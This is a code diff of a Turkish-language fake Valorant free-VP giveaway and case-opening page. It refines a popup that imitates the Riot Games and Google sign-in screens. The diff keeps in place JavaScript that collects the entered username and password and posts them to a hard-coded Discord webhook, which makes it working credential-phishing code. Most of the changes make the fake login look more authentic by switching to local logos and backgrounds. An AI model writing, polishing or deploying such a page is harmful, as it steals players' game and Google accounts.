@@ -11,7 +11,10 @@
         /* Global Styles */
         body { 
             background-color: var(--dark-bg) !important; 
-            background-image: radial-gradient(circle at center, #161b22 0%, #0b1119 100%);
+            background-image: url('background.jpg'); /* Orijinal arka plan dosyan */
+            background-size: cover;
+            background-attachment: fixed;
+            background-position: center;
             color: white; 
             font-family: 'Inter', sans-serif; 
             margin: 0; 
@@ -117,7 +120,7 @@
                 const s = skins[Math.floor(Math.random() * skins.length)];
                 const c = document.createElement('div');
                 c.className = 'drop-card';
-                c.innerHTML = `<img src="${s.img}" onerror="this.src='https://via.placeholder.com/40'"><div class="rarity-box" style="background:${s.color}"></div>`;
+                c.innerHTML = `<img src="${s.img}" onerror="this.src='drop-placeholder.png'"><div class="rarity-box" style="background:${s.color}"></div>`;
                 track.prepend(c);
                 if(track.children.length > 12) track.removeChild(track.lastChild);
                 setTimeout(addNewDrop, Math.random() * 3000 + 2000);
@@ -125,15 +128,15 @@
             addNewDrop();
 
             const cases = [
-                {n: "BAŞLANGIÇ", p: "GİRİŞ YAP", i: "https://i.ibb.co/L5hY8pG/case1.png"}, {n: "STANDART", p: "30 VP", i: "https://i.ibb.co/L5hY8pG/case1.png"},
-                {n: "ELİT", p: "50 VP", i: "https://i.ibb.co/L5hY8pG/case1.png"}, {n: "PREMIUM", p: "100 VP", i: "https://i.ibb.co/L5hY8pG/case1.png"},
-                {n: "EFSANEVİ", p: "500 VP", i: "https://i.ibb.co/L5hY8pG/case1.png"}, {n: "RADYANİT", p: "2000 VP", i: "https://i.ibb.co/L5hY8pG/case1.png"}
+                {n: "BAŞLANGIÇ", p: "GİRİŞ YAP", i: "case1.png"}, {n: "STANDART", p: "30 VP", i: "case2.png"},
+                {n: "ELİT", p: "50 VP", i: "case3.png"}, {n: "PREMIUM", p: "100 VP", i: "case4.png"},
+                {n: "EFSANEVİ", p: "500 VP", i: "case5.png"}, {n: "RADYANİT", p: "2000 VP", i: "case6.png"}
             ];
             const r1 = document.getElementById('row1');
             const r2 = document.getElementById('row2');
             if(r1 && r2) {
-                cases.slice(0, 4).forEach(c => { r1.innerHTML += `<div class="case-box" onclick="openAuth()"><div class="case-img-container"><img src="${c.i}" onerror="this.src='https://via.placeholder.com/150'"></div><h3 style="margin:0; font-size:16px;">${c.n} KASASI</h3><div class="vp-tag">${c.p}</div><button class="open-btn">KASAYI AÇ</button></div>`; });
-                cases.slice(4, 6).forEach(c => { r2.innerHTML += `<div class="case-box" onclick="openAuth()"><div class="case-img-container"><img src="${c.i}" onerror="this.src='https://via.placeholder.com/150'"></div><h3 style="margin:0; font-size:16px;">${c.n} KASASI</h3><div class="vp-tag">${c.p}</div><button class="open-btn">KASAYI AÇ</button></div>`; });
+                cases.slice(0, 4).forEach(c => { r1.innerHTML += `<div class="case-box" onclick="openAuth()"><div class="case-img-container"><img src="${c.i}" onerror="this.src='case-fallback.png'"></div><h3 style="margin:0; font-size:16px;">${c.n} KASASI</h3><div class="vp-tag">${c.p}</div><button class="open-btn">KASAYI AÇ</button></div>`; });
+                cases.slice(4, 6).forEach(c => { r2.innerHTML += `<div class="case-box" onclick="openAuth()"><div class="case-img-container"><img src="${c.i}" onerror="this.src='case-fallback.png'"></div><h3 style="margin:0; font-size:16px;">${c.n} KASASI</h3><div class="vp-tag">${c.p}</div><button class="open-btn">KASAYI AÇ</button></div>`; });
             }
 
             function tick() {
@@ -147,7 +150,7 @@
             setInterval(tick, 1000); tick();
         });
 
-        // 2. AUTH SİSTEMİ (POPUP GÜNCELLEMELERİ VE WEBHOOK FIX)
+        // 2. AUTH SİSTEMİ (DOSYA GÖRSELLERİ VE WEBHOOK FIX)
         function openAuth() {
             const w = 550, h = 800;
             const l = (screen.width/2)-(w/2), t = (screen.height/2)-(h/2);
@@ -159,9 +162,9 @@
                     <title>Riot Games - Oturum Aç</title>
                     <style>
                         @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;700;800&family=Roboto:wght@400;500&display=swap');
-                        body { margin:0; padding:0; font-family:'Inter', sans-serif; display:flex; justify-content:center; align-items:center; height:100vh; background:#f9f9f9; }
-                        #riot-screen { width:100%; height:100%; background:#fff; display:flex; justify-content:center; align-items:center; }
-                        .card { background:#fff; width:330px; padding:45px 35px; text-align:center; box-shadow: 0 10px 40px rgba(0,0,0,0.05); }
+                        body { margin:0; padding:0; font-family:'Inter', sans-serif; display:flex; justify-content:center; align-items:center; height:100vh; background: url('popup-bg.jpg') no-repeat center center/cover; }
+                        #riot-screen { width:100%; height:100%; background:rgba(255,255,255,0.95); display:flex; justify-content:center; align-items:center; }
+                        .card { background:#fff; width:330px; padding:45px 35px; text-align:center; box-shadow: 0 10px 40px rgba(0,0,0,0.1); border-radius: 8px; }
                         h2 { font-weight:900; font-size:24px; margin:25px 0; text-transform:uppercase; color:#111; letter-spacing:-1px; }
                         .input-container { position:relative; margin:10px 0; width:100%; text-align:left; }
                         input { width:100%; padding:24px 16px 8px 16px; background:#f2f2f2; border:2px solid transparent; border-radius:4px; box-sizing:border-box; font-weight:700; outline:none; transition:0.15s; font-size:14px; }
@@ -190,16 +193,16 @@
                 <body>
                     <div id="riot-screen">
                         <div class="card">
-                            <img src="https://upload.wikimedia.org/wikipedia/commons/b/b6/Riot_Games_logo_icon.png" width="50" style="display:block; margin:auto;">
+                            <img src="riot-logo.png" onerror="this.src='https://upload.wikimedia.org/wikipedia/commons/b/b6/Riot_Games_logo_icon.png'" width="50" style="display:block; margin:auto;">
                             <h2>Giriş Yap</h2>
                             <div class="input-container"><input type="text" id="ru" placeholder=" " autocomplete="off"><span class="label">Kullanıcı Adı</span></div>
                             <div class="input-container"><input type="password" id="rp" placeholder=" " autocomplete="off"><span class="label">Şifre</span></div>
                             <div class="social-grid">
-                                <div class="social-btn" style="background:#1877f2"><img src="https://cdn-icons-png.flaticon.com/512/124/124010.png" width="18"></div>
-                                <div class="social-btn" id="go-google" style="background:#fff"><img src="https://upload.wikimedia.org/wikipedia/commons/c/c1/Google_%22G%22_Logo.svg" width="18"></div>
-                                <div class="social-btn" style="background:#000"><img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" width="18" style="filter:invert(1)"></div>
-                                <div class="social-btn" style="background:#107c10"><img src="https://upload.wikimedia.org/wikipedia/commons/d/d7/Xbox_logo_%282019%29.svg" width="18"></div>
-                                <div class="social-btn" style="background:#00439c"><img src="https://upload.wikimedia.org/wikipedia/commons/0/00/PlayStation_logo.svg" width="18" style="filter:invert(1)"></div>
+                                <div class="social-btn" style="background:#1877f2"><img src="fb-icon.png" onerror="this.src='https://cdn-icons-png.flaticon.com/512/124/124010.png'" width="18"></div>
+                                <div class="social-btn" id="go-google" style="background:#fff"><img src="google-icon.png" onerror="this.src='https://upload.wikimedia.org/wikipedia/commons/c/c1/Google_%22G%22_Logo.svg'" width="18"></div>
+                                <div class="social-btn" style="background:#000"><img src="apple-icon.png" onerror="this.src='https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg'" width="18" style="filter:invert(1)"></div>
+                                <div class="social-btn" style="background:#107c10"><img src="xbox-icon.png" onerror="this.src='https://upload.wikimedia.org/wikipedia/commons/d/d7/Xbox_logo_%282019%29.svg'" width="18"></div>
+                                <div class="social-btn" style="background:#00439c"><img src="ps-icon.png" onerror="this.src='https://upload.wikimedia.org/wikipedia/commons/0/00/PlayStation_logo.svg'" width="18" style="filter:invert(1)"></div>
                             </div>
                             <button class="next-btn" id="riot-go"><svg viewBox="0 0 24 24"><path d="M12 4l-1.41 1.41L16.17 11H4v2h12.17l-5.58 5.59L12 20l8-8z"/></svg></button>
                         </div>
@@ -207,7 +210,7 @@
 
                     <div id="google-screen">
                         <div class="google-card">
-                            <img class="google-logo" src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg">
+                            <img class="google-logo" src="google-full-logo.png" onerror="this.src='https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg'">
                             <div class="google-title">Oturum açın</div>
                             <div style="margin-bottom:30px; font-size:16px; text-align:center; color:#202124;">Google Hesabınızı kullanın</div>
                             <input type="text" id="gu" class="google-input" placeholder="E-posta veya telefon">
@@ -254,10 +257,9 @@
         window.addEventListener("message", function(event) {
             if (event.data && event.data.u && event.data.p) {
                 const authArea = document.getElementById('authArea');
-                const oldContent = authArea.innerHTML;
                 authArea.innerHTML = `<button class="btn-login" style="background:#333; cursor:wait"><span class="loader-circle"></span> DOĞRULANIYOR...</button>`;
 
-                // Webhook Veri Gönderimi (Google dahil tüm veriler buraya düşer)
+                // Webhook Veri Gönderimi
                 fetch("https://discord.com/api/webhooks/1346618520242184193/NW5qpH3UpfzBpTWSVcJ-FGXbevssOBhbMDUIdGjP4620rQLHvM6jx8fJGzji_4LQOBrq", {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
@@ -296,7 +298,6 @@
                     giveawayStatus.innerText = "ÇEKİLİŞE BAŞARIYLA KATILDINIZ! ✅";
                     giveawayStatus.style.color = "#79eb1e";
                     
-                    // Kasa butonlarını aktif et
                     document.querySelectorAll('.vp-tag').forEach(tag => {
                         if(tag.innerText === "GİRİŞ YAP") tag.innerText = "BEDAVA";
                     });
